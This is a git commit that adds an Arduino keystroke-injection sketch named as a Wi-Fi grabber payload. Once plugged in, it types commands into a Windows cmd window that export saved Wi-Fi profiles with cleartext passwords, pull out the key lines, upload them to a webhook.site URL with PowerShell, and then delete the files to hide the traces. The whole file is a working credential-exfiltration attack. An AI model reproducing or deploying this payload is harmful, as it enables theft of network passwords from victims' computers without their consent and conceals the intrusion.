be555362fe9b24c67f15e6b50f10f08199e70dda
Benji Brown <116900000+benjibrown@users.noreply.github.com>
2022-11-04 19:56:58 +0000

    Create grab.ino

---
+++ payloads/exfiltration/wifi-grabber/grab.ino
@@ -0,0 +1,40 @@
+#include<Keyboard.h>
+#define KEY_DELAY 50 //delay between keystrokes for slow computers
+
+//a command line to execute
+const char command [] = "echo hello hackers";
+
+void setup() {
+  Keyboard.begin();
+
+  delay(3000);
+}
+
+void loop() {
+  //Pressing Win+r shortcut
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  delay(KEY_DELAY);
+  Keyboard.releaseAll();
+  delay(KEY_DELAY*5);
+  //Inputting cmd command
+  Keyboard.println("cmd /k");
+
+  delay(KEY_DELAY*5);//A delay to ensure that cmd window has been started
+  //Typing the command
+  Keyboard.println("cd %temp%");
+  delay(500);
+  Keyboard.println("netsh wlan export profile key=clear");
+  delay(1000);
+  Keyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WiFi-PASS");
+  delay(1000);
+  Keyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/webhook-url-here -Method POST -InFile WiFi-PASS");
+  delay(3000);
+  Keyboard.println("del WiFi* /s /f /q");
+  delay(500);
+  Keyboard.println("exit");
+
+
+  
+  delay(4000);
+}
